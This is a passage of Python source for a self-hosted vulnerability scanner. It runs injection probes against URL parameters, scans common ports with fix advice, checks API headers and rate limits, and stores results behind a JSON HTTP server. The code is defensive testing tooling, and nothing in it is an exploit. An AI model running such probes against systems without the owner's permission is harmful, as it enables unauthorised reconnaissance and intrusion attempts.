        flags.append({"flag": "missing_headers", "label": f"Missing: {', '.join(missing_hdrs)}", "severity": "Low"})
    snippet = body[:480].replace("\n", " ").replace("\r", "")
    return {
        "method": method, "status": st,
        "time_ms": round((resp.get("time") or 0) * 1000),
        "flags": flags, "snippet": snippet, "error": resp.get("error"),
        "auth_required": st in (401, 403),
    }


def run_api_security_scan(base_url: str, paths: list = None) -> dict:
    """Enhanced API scanner: authentication, injection, rate limit, header checks."""
    if not base_url.startswith(("http://", "https://")):
        base_url = "https://" + base_url
    ok, err = validate_url(base_url)
    if not ok:
        raise ValueError(err)
    paths = paths or list(DEFAULT_API_PATHS)
    if len(paths) > 24:
        paths = paths[:24]
    add_log(f"API security scan: {base_url} ({len(paths)} paths)", "INFO", "APISEC")
    results = []
    all_findings = []
    security_score = 100

    for path in paths:
        path = str(path).strip()
        if not path: continue
        full = _join_url(base_url, path)
        r_get = _http_get_api(full)
        r_post = _http_json_post(full)
        g = _analyze_api_resp(r_get, "GET", path)
        p = _analyze_api_resp(r_post, "POST", path)
        endpoint_findings = []
        for part in (g, p):
            for fl in part["flags"]:
                sev = fl.get("severity", "Medium")
                all_findings.append({
                    "severity": sev, "endpoint": path,
                    "method": part["method"], "flag": fl["flag"],
                    "label": fl["label"],
                })
                endpoint_findings.append(fl)
                if sev == "Critical": security_score -= 20
                elif sev == "High": security_score -= 10
                elif sev == "Medium": security_score -= 5
                elif sev == "Low": security_score -= 2
        # Injection tests on this path
        inj_results = []
        for vuln_name, payload in INJECTION_PAYLOADS.items():
            finding = _inject_and_check(base_url, path, payload, vuln_name)
            if finding:
                inj_results.append(finding)
                sev = finding["severity"]
                all_findings.append({
                    "severity": sev, "endpoint": path,
                    "method": "POST", "flag": vuln_name.lower().replace(" ", "_"),
                    "label": f"{vuln_name}: {finding['evidence']}",
                })
                if sev == "Critical": security_score -= 25
                elif sev == "High": security_score -= 15

        results.append({"path": path, "url": full, "get": g, "post": p, "injections": inj_results})

    # Rate limit check on first path
    rate_limit_missing = False
    if paths:
        rate_limit_missing = _detect_rate_limit(base_url, paths[0])
        if rate_limit_missing:
            all_findings.append({
                "severity": "Medium", "endpoint": paths[0],
                "method": "GET", "flag": "no_rate_limit",
                "label": "No rate limiting detected (8 rapid requests succeeded)",
            })
            security_score -= 8

    # Deduplicate
    seen, uniq = set(), []
    for f in all_findings:
        k = (f["endpoint"], f["method"], f["flag"])
        if k not in seen: seen.add(k); uniq.append(f)
    all_findings = uniq

    security_score = max(0, min(100, security_score))
    vuln = len(all_findings) > 0

    # Compute severity counts
    sev_counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0}
    for f in all_findings:
        sev_counts[f.get("severity", "Low")] = sev_counts.get(f.get("severity", "Low"), 0) + 1

    summary = f"Tested {len(results)} endpoint(s). "
    if vuln:
        summary += f"{len(all_findings)} issue(s) found: {sev_counts['Critical']} Critical, {sev_counts['High']} High, {sev_counts['Medium']} Medium, {sev_counts['Low']} Low."
    else:
        summary += "No automated issues flagged — endpoints may still require manual review."
    add_log(f"API scan done — {len(all_findings)} findings, score={security_score}", "INFO", "APISEC")
    return {
        "base_url": base_url,
        "endpoints_tested": len(results),
        "findings": all_findings,
        "results": results,
        "vulnerable": vuln,
        "summary": summary,
        "security_score": security_score,
        "severity_counts": sev_counts,
        "rate_limit_missing": rate_limit_missing,
    }




# ── Port / Network Scanner ─────────────────────────────────────────────────────
PORT_DEFINITIONS = {
    21:    {"service": "FTP",        "risk": "High",     "desc": "File Transfer Protocol — often misconfigured, supports anonymous login."},
    22:    {"service": "SSH",        "risk": "Medium",   "desc": "Secure Shell — brute-force risk if exposed to the internet."},
    25:    {"service": "SMTP",       "risk": "Medium",   "desc": "Mail transfer — open relay can be abused for spam."},
    53:    {"service": "DNS",        "risk": "Low",      "desc": "Domain Name Service — DNS amplification risk if recursive queries enabled."},
    80:    {"service": "HTTP",       "risk": "Low",      "desc": "Unencrypted web traffic — data sent in plaintext."},
    443:   {"service": "HTTPS",      "risk": "Low",      "desc": "Encrypted web traffic — standard secure web port."},
    3306:  {"service": "MySQL",      "risk": "Critical", "desc": "MySQL database — publicly exposed DB port is a critical data exposure risk."},
    5432:  {"service": "PostgreSQL", "risk": "Critical", "desc": "PostgreSQL database — publicly exposed DB port is a critical data exposure risk."},
    6379:  {"service": "Redis",      "risk": "Critical", "desc": "Redis cache — often runs without auth; publicly exposed is critical."},
    8080:  {"service": "HTTP-Alt",   "risk": "Medium",   "desc": "Alternate HTTP port — often used for dev/staging servers or proxies."},
    8443:  {"service": "HTTPS-Alt",  "risk": "Low",      "desc": "Alternate HTTPS port — used by some web apps and admin panels."},
    27017: {"service": "MongoDB",    "risk": "Critical", "desc": "MongoDB — publicly exposed NoSQL DB; historically breached at scale."},
    9200:  {"service": "Elasticsearch","risk":"Critical","desc": "Elasticsearch — publicly exposed search index; data exposure risk."},
    3389:  {"service": "RDP",        "risk": "High",     "desc": "Remote Desktop Protocol — brute-force and exploit risk."},
    5900:  {"service": "VNC",        "risk": "High",     "desc": "Virtual Network Computing — often poorly secured remote desktop."},
}

RISK_SEVERITY_ORDER = {"Critical": 4, "High": 3, "Medium": 2, "Low": 1, "Info": 0}


def scan_port(host: str, port: int, timeout: float = 2.5) -> str:
    """Returns 'open', 'closed', or 'filtered'."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return "open"
    except ConnectionRefusedError:
        return "closed"
    except (socket.timeout, OSError):
        return "filtered"


def run_port_scan(target_url: str) -> dict:
    """Resolve domain, scan common ports, assess risk."""
    add_log(f"Port scan starting for: {target_url}", "INFO", "PORTSCAN")
    parsed = urllib.parse.urlparse(target_url)
    host = parsed.hostname or target_url.replace("https://", "").replace("http://", "").split("/")[0].strip()
    if not host:
        raise ValueError("Could not extract hostname from URL.")

    # Validate not private
    ok, err = validate_url(f"https://{host}")
    if not ok:
        raise ValueError(err)

    # Resolve IP
    try:
        ip = socket.gethostbyname(host)
    except socket.gaierror as e:
        raise ValueError(f"DNS resolution failed: {e}")

    add_log(f"Resolved {host} → {ip}", "INFO", "PORTSCAN")

    scan_start = time.monotonic()
    port_results = []
    open_ports = []
    findings = []

    for port, meta in PORT_DEFINITIONS.items():
        add_log(f"Scanning port {port} ({meta['service']})…", "DEBUG", "PORTSCAN")
        status = scan_port(host, port)
        entry = {
            "port": port,
            "service": meta["service"],
            "status": status,
            "risk": meta["risk"] if status == "open" else "Info",
            "desc": meta["desc"],
        }
        port_results.append(entry)
        if status == "open":
            open_ports.append(port)
            sev = meta["risk"]
            findings.append({
                "port": port,
                "service": meta["service"],
                "severity": sev,
                "issue": f"{meta['service']} port {port} is publicly accessible",
                "fix": _port_fix(port, meta["service"]),
            })
            add_log(f"OPEN [{sev}]: port {port} ({meta['service']})", "VULN" if sev in ("Critical","High") else "WARN", "PORTSCAN")

    # Check HTTP vs HTTPS
    http_open = any(r["port"] == 80 and r["status"] == "open" for r in port_results)
    https_open = any(r["port"] == 443 and r["status"] == "open" for r in port_results)
    if http_open and not https_open:
        findings.append({
            "port": 80, "service": "HTTP",
            "severity": "Medium",
            "issue": "Port 80 (HTTP) is open but port 443 (HTTPS) is not — traffic is unencrypted",
            "fix": "Enable HTTPS and redirect all HTTP traffic to HTTPS.",
        })

    # Overall risk
    max_risk = "Low"
    for f in findings:
        if RISK_SEVERITY_ORDER.get(f["severity"], 0) > RISK_SEVERITY_ORDER.get(max_risk, 0):
            max_risk = f["severity"]

    duration = round(time.monotonic() - scan_start, 2)
    add_log(f"Port scan done — {len(open_ports)} open, risk={max_risk}, {duration}s", "INFO", "PORTSCAN")

    return {
        "host": host,
        "ip": ip,
        "target_url": target_url,
        "ports_scanned": len(PORT_DEFINITIONS),
        "open_ports": open_ports,
        "findings": findings,
        "port_results": port_results,
        "overall_risk": max_risk,
        "vulnerable": len(findings) > 0,
        "duration_seconds": duration,
        "scan_time": dt.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"),
    }


def _port_fix(port: int, service: str) -> str:
    fixes = {
        21:    "Disable FTP if not required; use SFTP/FTPS instead. Block port 21 in firewall for public access.",
        22:    "Restrict SSH to specific IP ranges via firewall. Disable password auth, use key-based auth only. Consider moving to non-standard port.",
        25:    "Disable open relay; require authentication for SMTP. Block port 25 for inbound if not a mail server.",
        53:    "Restrict DNS to authoritative queries only; disable recursion for public IPs to prevent amplification.",
        80:    "Redirect HTTP → HTTPS using a 301 redirect. Ensure no sensitive data is served over HTTP.",
        443:   "Keep HTTPS enabled. Ensure TLS 1.2+ only, valid certificate, and HSTS header set.",
        3306:  "Never expose MySQL publicly. Bind to 127.0.0.1 in my.cnf. Use firewall rules to block port 3306.",
        5432:  "Bind PostgreSQL to localhost. Use pg_hba.conf to restrict access. Block port 5432 in firewall.",
        6379:  "Bind Redis to 127.0.0.1 (bind 127.0.0.1 in redis.conf). Enable requirepass authentication.",
        8080:  "Restrict HTTP-Alt port to internal networks. Do not expose dev/staging servers publicly.",
        8443:  "Ensure HTTPS-Alt uses valid certificates and is necessary for production use.",
        27017: "Bind MongoDB to localhost (bind_ip = 127.0.0.1). Enable authentication (--auth flag). Block port 27017.",
        9200:  "Bind Elasticsearch to localhost. Enable X-Pack security. Block port 9200 in firewall.",
        3389:  "Disable RDP if not needed. Use VPN or IP whitelist. Enable Network Level Authentication (NLA).",
        5900:  "Disable VNC if not needed. Use SSH tunneling. Set strong VNC password and restrict access by IP.",
    }
    return fixes.get(port, f"Close or firewall port {port} if {service} is not required for public access.")





# ── HTTP helpers ───────────────────────────────────────────────────────────────
HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; VulnScanPro/3.0)",
    "Accept":     "text/html,application/xhtml+xml,*/*;q=0.8",
    "Connection": "close",
}

def _http_get(url, timeout=REQUEST_TIMEOUT):
    start = time.monotonic()
    try:
        req = urllib.request.Request(url, headers=HEADERS)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            elapsed = time.monotonic() - start
            body = resp.read(16384).decode("utf-8", errors="replace")
            return {"ok":True,"status":resp.status,"body":body,"time":round(elapsed,3)}
    except urllib.error.HTTPError as e:
        elapsed = time.monotonic() - start
        try: body = e.read(8192).decode("utf-8", errors="replace")
        except: body = ""
        return {"ok":False,"status":e.code,"body":body,"time":round(elapsed,3),"error":str(e)}
    except Exception as ex:
        elapsed = time.monotonic() - start
        return {"ok":False,"status":None,"body":"","time":round(elapsed,3),"error":str(ex)}

def _inject_url(base_url, param, payload):
    p = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
    qs[param] = [payload]
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(qs, doseq=True)))

def _significant_diff(a, b, threshold=0.25):
    if not a: return False
    ratio = difflib.SequenceMatcher(None, a[:4000], b[:4000]).ratio()
    return (1 - ratio) > threshold

def collect_baseline(url, param):
    results = []
    for i in range(2):
        r = _http_get(_inject_url(url, param, str(i+1)))
        results.append(r)
    avg = sum(r["time"] for r in results) / len(results)
    return {"status": results[-1].get("status"), "body": results[-1].get("body",""), "avg_time": avg}

def test_single(base_url, param, test, baseline):
    payload  = test["payload"]
    is_time  = test["type"] in ("Time-Based",) or any(k in payload.lower() for k in ("sleep","waitfor","pg_sleep"))
    inj_url  = _inject_url(base_url, param, payload)
    result   = _http_get(inj_url, timeout=REQUEST_TIMEOUT + (6 if is_time else 0))
    body     = result["body"]

    finding = {
        "test_id": test["id"], "name": test["name"], "category": test["category"],
        "type": test["type"], "risk": test["risk"], "param": param,
        "payload": payload, "status_code": result["status"],
        "response_time": result["time"], "vulnerable": False,
        "confidence": "none", "evidence": "", "reason": "clean",
        "injected_url": inj_url,
        "fix": OWASP_FIXES.get(test["category"], {}),
    }

    for pattern, label in ERROR_SIGNATURES:
        if re.search(pattern, body, re.IGNORECASE):
            finding.update(vulnerable=True, confidence="high", evidence=label, reason="error_pattern")
            return finding

    if is_time and result["time"] >= TIME_BASED_THRESHOLD:
        finding.update(vulnerable=True, confidence="medium",
                       evidence=f"Response delayed {result['time']}s", reason="time_based")
        return finding

    if result.get("status") in (500,503) and baseline.get("status") not in (500,503):
        finding.update(vulnerable=True, confidence="medium",
                       evidence=f"HTTP {result['status']} triggered by injection", reason="http_error")
        return finding

    return finding


# ── Full scan orchestrator ─────────────────────────────────────────────────────
def run_scan(target_url: str, selected_categories: list = None) -> dict:
    with scan_semaphore:
        add_log(f"=== SCAN STARTED: {target_url} ===", "INFO", "SCANNER")

        if not target_url.startswith(("http://","https://")):
            target_url = "http://" + target_url

        ok, err = validate_url(target_url)
        if not ok:
            add_log(f"Target blocked: {err}", "ERROR", "SECURITY")
            raise ValueError(err)

        parsed = urllib.parse.urlparse(target_url)
        params = list(urllib.parse.parse_qs(parsed.query, keep_blank_values=True).keys())
        if not params:
            add_log("No query params detected — using fallback 'id'", "WARN", "SCANNER")
            params = ["id"]

        # Filter tests by selected categories
        tests_to_run = VULNERABILITY_TESTS
        if selected_categories:
            tests_to_run = [t for t in VULNERABILITY_TESTS if t["category"] in selected_categories]
            add_log(f"Running {len(tests_to_run)} tests in categories: {selected_categories}", "INFO", "SCANNER")

        scan_time = dt.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
        start = time.monotonic()
        findings = []
        total_tests = 0
        vulns_found = 0

        # SSL check (always run if selected or no filter)
        ssl_result = None
        run_ssl = not selected_categories or "SSL/TLS" in selected_categories
        if run_ssl:
            add_log("--- Running SSL/HTTPS check ---", "INFO", "SCANNER")
            ssl_result = check_ssl(target_url)
            if ssl_result["vulnerable"]:
                vulns_found += 1

        # Injection tests
        for param in params:
            add_log(f"--- Testing parameter: '{param}' ({len(tests_to_run)} tests) ---", "INFO", "SCANNER")
            baseline = collect_baseline(target_url, param)
            for test in tests_to_run:
                add_log(f"[{test['id']}] {test['name']} → param='{param}'", "DEBUG", "SCANNER")
                try:
                    finding = test_single(target_url, param, test, baseline)
                except Exception as ex:
                    finding = {
                        "test_id": test["id"], "name": test["name"], "category": test["category"],
                        "type": test["type"], "risk": test["risk"], "param": param,
                        "payload": test["payload"], "status_code": None, "response_time": 0,
                        "vulnerable": False, "confidence": "none", "evidence": str(ex), "reason": "exception",
                        "fix": OWASP_FIXES.get(test["category"],{}),
                    }
                findings.append(finding)
                total_tests += 1
                if finding["vulnerable"]:
                    vulns_found += 1
                    add_log(f"VULN [{finding['risk']}]: {finding['name']} | {finding['evidence']}", "VULN", "SCANNER")

        duration  = round(time.monotonic() - start, 2)
        status    = "VULNERABLE" if vulns_found > 0 else "SAFE"
        scan_id   = save_scan(target_url, scan_time, total_tests, vulns_found, status, duration, findings)

        add_log(f"=== SCAN COMPLETE: {total_tests} tests | {vulns_found} vulns | {status} | {duration}s ===", "INFO", "SCANNER")

        return {
            "scan_id": scan_id, "target_url": target_url, "scan_time": scan_time,
            "total_tests": total_tests, "vulnerabilities_found": vulns_found,
            "status": status, "duration_seconds": duration,
            "params_tested": params, "results": findings,
            "ssl_result": ssl_result,
        }


# ── Database ───────────────────────────────────────────────────────────────────
def _db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    return conn

def init_db():
    with _db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS scans (
            id INTEGER PRIMARY KEY AUTOINCREMENT, target_url TEXT NOT NULL,
            scan_time TEXT NOT NULL, total_tests INTEGER,
            vulnerabilities_found INTEGER, status TEXT,
            duration_seconds REAL, results TEXT)''')
        conn.execute('''CREATE TABLE IF NOT EXISTS custom_tests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            description TEXT,
            url TEXT NOT NULL,
            method TEXT DEFAULT 'GET',
            payload TEXT,
            category TEXT DEFAULT 'Custom',
            expected_status INTEGER,
            created_at TEXT NOT NULL)''')
        conn.commit()
    add_log("Database initialised", "INFO", "DB")

def save_scan(target_url, scan_time, total, vulns, status, duration, results):
    with _db() as conn:
        cur = conn.execute(
            'INSERT INTO scans (target_url,scan_time,total_tests,vulnerabilities_found,status,duration_seconds,results) VALUES (?,?,?,?,?,?,?)',
            (target_url, scan_time, total, vulns, status, duration, json.dumps(results)))
        conn.commit()
        return cur.lastrowid

def get_all_scans():
    with _db() as conn:
        rows = conn.execute('SELECT id,target_url,scan_time,total_tests,vulnerabilities_found,status,duration_seconds FROM scans ORDER BY id DESC').fetchall()
        return [dict(r) for r in rows]

def get_scan_by_id(sid):
    with _db() as conn:
        row = conn.execute('SELECT * FROM scans WHERE id=?', (sid,)).fetchone()
        if row:
            d = dict(row)
            d["results"] = json.loads(d["results"])
            return d
    return None

def delete_scan(sid):
    with _db() as conn:
        conn.execute('DELETE FROM scans WHERE id=?', (sid,))
        conn.commit()


def get_all_custom_tests():
    with _db() as conn:
        rows = conn.execute('SELECT * FROM custom_tests ORDER BY id DESC').fetchall()
        return [dict(r) for r in rows]

def get_dashboard_summary():
    """Aggregate scans + custom_tests for dashboard charts (category / risk / timeline)."""
    category_tests = defaultdict(int)
    category_vuln = defaultdict(int)
    risk_counts = defaultdict(int)
    day_scans = defaultdict(int)
    day_vulns = defaultdict(int)
    target_stats = defaultdict(lambda: {"scans": 0, "vulns": 0})
    stats = {"total": 0, "vulnerable": 0, "safe": 0}
    with _db() as conn:
        rows = conn.execute("SELECT * FROM scans ORDER BY id").fetchall()
        ct_row = conn.execute("SELECT COUNT(*) AS c FROM custom_tests").fetchone()
    ct_count = int(ct_row["c"]) if ct_row else 0
    for r in rows:
        d = dict(r)
        stats["total"] += 1
        if d.get("status") == "VULNERABLE":
            stats["vulnerable"] += 1
        else:
            stats["safe"] += 1
        tu = d.get("target_url") or ""
        target_stats[tu]["scans"] += 1
        target_stats[tu]["vulns"] += int(d.get("vulnerabilities_found") or 0)
        st = d.get("scan_time") or ""
        if len(st) >= 10:
            day = st[:10]
            day_scans[day] += 1
            day_vulns[day] += int(d.get("vulnerabilities_found") or 0)
        try:
            res = json.loads(d.get("results") or "[]")
        except Exception:
            res = []
        if isinstance(res, list):
            for item in res:
                if not isinstance(item, dict):
                    continue
                cat = item.get("category") or "Unknown"
                category_tests[cat] += 1
                if item.get("vulnerable"):
                    category_vuln[cat] += 1
                    rsk = item.get("risk") or "Unknown"
                    risk_counts[rsk] += 1
    today = dt.now(timezone.utc).date()
    timeline = []
    for i in range(13, -1, -1):
        day = (today - timedelta(days=i)).isoformat()
        timeline.append({"date": day, "scans": day_scans.get(day, 0), "vulns": day_vulns.get(day, 0)})
    top_targets = [{"url": u, "scans": v["scans"], "vulns": v["vulns"]} for u, v in target_stats.items()]
    top_targets.sort(key=lambda x: (x["vulns"], x["scans"]), reverse=True)
    top_targets = top_targets[:12]
    cats = {}
    for k in set(category_tests.keys()) | set(category_vuln.keys()):
        cats[k] = {"tests": int(category_tests[k]), "vulnerable": int(category_vuln[k])}
    return {
        "stats": stats,
        "category_breakdown": cats,
        "risk_breakdown": dict(risk_counts),
        "timeline_14d": timeline,
        "custom_tests_count": ct_count,
        "top_targets": top_targets,
    }

def save_custom_test(name, description, url, method, payload, category, expected_status):
    created_at = dt.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    with _db() as conn:
        cur = conn.execute(
            'INSERT INTO custom_tests (name,description,url,method,payload,category,expected_status,created_at) VALUES (?,?,?,?,?,?,?,?)',
            (name, description, url, method or 'GET', payload or '', category or 'Custom', expected_status, created_at))
        conn.commit()
        return cur.lastrowid

def delete_custom_test(tid):
    with _db() as conn:
        conn.execute('DELETE FROM custom_tests WHERE id=?', (tid,))
        conn.commit()

def run_custom_test(tid: int) -> dict:
    """Execute a single custom test and return result."""
    with _db() as conn:
        row = conn.execute('SELECT * FROM custom_tests WHERE id=?', (tid,)).fetchone()
    if not row:
        raise ValueError(f"Custom test #{tid} not found.")
    t = dict(row)
    url = t["url"]
    if not url.startswith(("http://","https://")):
        url = "https://" + url
    ok, err = validate_url(url)
    if not ok:
        return {"test_id": tid, "name": t["name"], "error": err, "passed": False}
    method = (t.get("method") or "GET").upper()
    payload = t.get("payload") or ""
    expected = t.get("expected_status")
    add_log(f"Custom test #{tid}: {method} {url}", "INFO", "CUSTOM")
    start = time.monotonic()
    if method == "POST":
        resp = _http_json_post(url, data={"input": payload} if payload else {})
    else:
        full_url = url + ("&" if "?" in url else "?") + "input=" + urllib.parse.quote(payload) if payload else url
        resp = _http_get(full_url)
    elapsed = round(time.monotonic() - start, 3)
    status = resp.get("status")
    body = resp.get("body") or ""
    passed = True
    issues = []
    if expected and status != expected:
        issues.append(f"Expected status {expected}, got {status}")
        passed = False
    for pat, lbl in ERROR_SIGNATURES:
        if re.search(pat, body, re.IGNORECASE):
            issues.append(f"Vulnerability signal: {lbl}")
            passed = False
    add_log(f"Custom test #{tid} done — status={status}, passed={passed}", "INFO", "CUSTOM")
    return {
        "test_id": tid, "name": t["name"], "url": url,
        "method": method, "payload": payload,
        "status_code": status, "response_time": elapsed,
        "issues": issues, "passed": passed,
        "body_snippet": body[:400],
    }


# ── HTTP Server ────────────────────────────────────────────────────────────────
class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args): pass

    def _norm_path(self) -> str:
        p = (self.path or "").split("?")[0].strip()
        if len(p) > 1 and p.endswith("/"):
            p = p.rstrip("/")
        return p if p else "/"

    def _cors(self):
        self.send_header("Access-Control-Allow-Origin","*")
        self.send_header("Access-Control-Allow-Methods","GET,POST,DELETE,OPTIONS")
        self.send_header("Access-Control-Allow-Headers","Content-Type")

    def send_json(self, data, code=200):
        body = json.dumps(data, default=str).encode()
        self.send_response(code)
        self.send_header("Content-Type","application/json")
        self.send_header("Content-Length",str(len(body)))
        self._cors()
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_response(200); self._cors(); self.end_headers()

    def do_GET(self):
        path = self.path.split("?")[0]
        if path == "/":
            for name in ("index_redesigned.html", "index.html"):
                try:
                    with open(name, "r", encoding="utf-8") as f:
                        html = f.read().encode()
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html; charset=utf-8")
                    self.send_header("Content-Length", str(len(html)))
                    self._cors()
                    self.end_headers()
                    self.wfile.write(html)
                    break
                except FileNotFoundError:
                    continue
            else:
                self.send_json({"error": "No index_redesigned.html or index.html found"}, 404)
        elif path == "/api/scans":        self.send_json(get_all_scans())
        elif path.startswith("/api/scans/"):
            try:
                sid = int(path.split("/")[-1])
                s = get_scan_by_id(sid)
                self.send_json(s) if s else self.send_json({"error":"Not found"},404)
            except: self.send_json({"error":"Invalid ID"},400)
        elif path == "/api/stats":
            scans = get_all_scans()
            total = len(scans); vuln = sum(1 for s in scans if s["status"]=="VULNERABLE")
            self.send_json({"total":total,"vulnerable":vuln,"safe":total-vuln})
        elif path == "/api/dashboard":
            self.send_json(get_dashboard_summary())
        elif path == "/api/logs":
            since = 0
            try:
                qs = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
                since = int(qs.get("since",["0"])[0])
            except: pass
            entries = get_logs(since)
            self.send_json({"logs":entries,"total":len(logs),"count":len(entries)})
        elif path == "/api/payloads":     self.send_json(VULNERABILITY_TESTS)
        elif path == "/api/categories":   self.send_json(list(OWASP_FIXES.keys()))
        elif path == "/api/owasp_fixes":  self.send_json(OWASP_FIXES)
        elif path == "/api/custom_tests": self.send_json(get_all_custom_tests())
        else: self.send_json({"error":"Not found"},404)

    def do_POST(self):
        path = self._norm_path()
        if path == "/api/scan":
            try:
                length = int(self.headers.get("Content-Length",0) or 0)
                if length > 8192: self.send_json({"error":"Payload too large"},413); return
                data = json.loads(self.rfile.read(length).decode("utf-8")) if length else {}
                url  = str(data.get("url","")).strip()
                cats = data.get("categories", None)  # optional list of categories
                if not url: self.send_json({"error":"url required"},400); return
                if not url.startswith(("http://","https://")): url = "http://" + url
                result = run_scan(url, cats)
                self.send_json(result)
            except ValueError as e: self.send_json({"error":str(e)},422)
            except json.JSONDecodeError: self.send_json({"error":"Invalid JSON"},400)
            except Exception as e:
                add_log(f"Scan error: {e}","ERROR","API")
                self.send_json({"error":"Internal scan error"},500)
        elif path == "/api/ssl":
            try:
                length = int(self.headers.get("Content-Length",0) or 0)
                if length > 16384: self.send_json({"error":"Payload too large"},413); return
                data = json.loads(self.rfile.read(length).decode("utf-8")) if length else {}
                url  = str(data.get("url","")).strip()
                if not url: self.send_json({"error":"url required"},400); return
                result = check_ssl(url)
                self.send_json(result)
            except json.JSONDecodeError: self.send_json({"error":"Invalid JSON"},400)
            except Exception as e: self.send_json({"error":str(e)},500)
        elif path == "/api/api_security":
            try:
                length = int(self.headers.get("Content-Length",0) or 0)
                if length > 16384: self.send_json({"error":"Payload too large"},413); return
                data = json.loads(self.rfile.read(length).decode("utf-8")) if length else {}
                url = str(data.get("url", "")).strip()
                paths = data.get("paths")
                if paths is not None and not isinstance(paths, list):
                    self.send_json({"error":"paths must be a list"},400); return
                if not url: self.send_json({"error":"url required"},400); return
                if not url.startswith(("http://", "https://")):
                    url = "https://" + url
                result = run_api_security_scan(url, paths)
                self.send_json(result)
            except ValueError as e: self.send_json({"error":str(e)},422)
            except json.JSONDecodeError: self.send_json({"error":"Invalid JSON"},400)
            except Exception as e:
                add_log(f"API security scan error: {e}", "ERROR", "API")
                self.send_json({"error":str(e)},500)
        elif path == "/api/port_scan":
            try:
                length = int(self.headers.get("Content-Length",0) or 0)
                if length > 8192: self.send_json({"error":"Payload too large"},413); return
                data = json.loads(self.rfile.read(length).decode("utf-8")) if length else {}
                url  = str(data.get("url","")).strip()
                if not url: self.send_json({"error":"url required"},400); return
                if not url.startswith(("http://","https://")): url = "https://" + url
                result = run_port_scan(url)
                self.send_json(result)
            except ValueError as e: self.send_json({"error":str(e)},422)
            except json.JSONDecodeError: self.send_json({"error":"Invalid JSON"},400)
            except Exception as e:
                add_log(f"Port scan error: {e}","ERROR","API")
                self.send_json({"error":str(e)},500)
        elif path == "/api/custom_tests":
            try:
                length = int(self.headers.get("Content-Length",0) or 0)
                if length > 16384: self.send_json({"error":"Payload too large"},413); return
                data = json.loads(self.rfile.read(length).decode("utf-8")) if length else {}
                name = str(data.get("name","")).strip()
                url  = str(data.get("url","")).strip()
                if not name or not url: self.send_json({"error":"name and url required"},400); return
                tid = save_custom_test(
                    name, data.get("description",""), url,
                    data.get("method","GET"), data.get("payload",""),
                    data.get("category","Custom"), data.get("expected_status",200)
                )
                self.send_json({"id":tid,"created":True})
            except json.JSONDecodeError: self.send_json({"error":"Invalid JSON"},400)
            except Exception as e: self.send_json({"error":str(e)},500)
        elif path.startswith("/api/custom_tests/") and path.endswith("/run"):
            try:
                tid = int(path.split("/")[-2])
                result = run_custom_test(tid)
                self.send_json(result)
            except ValueError as e: self.send_json({"error":str(e)},422)
            except Exception as e: self.send_json({"error":str(e)},500)
        else: self.send_json({"error":"Not found"},404)

    def do_DELETE(self):
        if self.path.startswith("/api/scans/"):
            try:
                sid = int(self.path.split("/")[-1])
                delete_scan(sid); self.send_json({"deleted":sid})
            except: self.send_json({"error":"Invalid ID"},400)
        elif self.path.startswith("/api/custom_tests/"):
            try:
                tid = int(self.path.split("/")[-1])
                delete_custom_test(tid); self.send_json({"deleted":tid})
            except: self.send_json({"error":"Invalid ID"},400)
        elif self.path == "/api/logs":
            with log_lock: logs.clear()
            self.send_json({"cleared":True})
        else: self.send_json({"error":"Not found"},404)


if __name__ == "__main__":
    init_db()
    PORT = int(os.environ.get("PORT",8765))
    add_log(f"VulnScan Pro v3.0 — port {PORT}","INFO","STARTUP")
    add_log(f"Database: {os.path.abspath(DB_PATH)}","INFO","STARTUP")
    add_log(f"Vulnerability tests: {len(VULNERABILITY_TESTS)}","INFO","STARTUP")
    server = HTTPServer(("0.0.0.0",PORT), Handler)
    print(f"[VulnScan Pro v3] http://localhost:{PORT}", flush=True)
    try: server.serve_forever()
    except KeyboardInterrupt:
        add_log("Shutting down","INFO","STARTUP"); server.server_close()
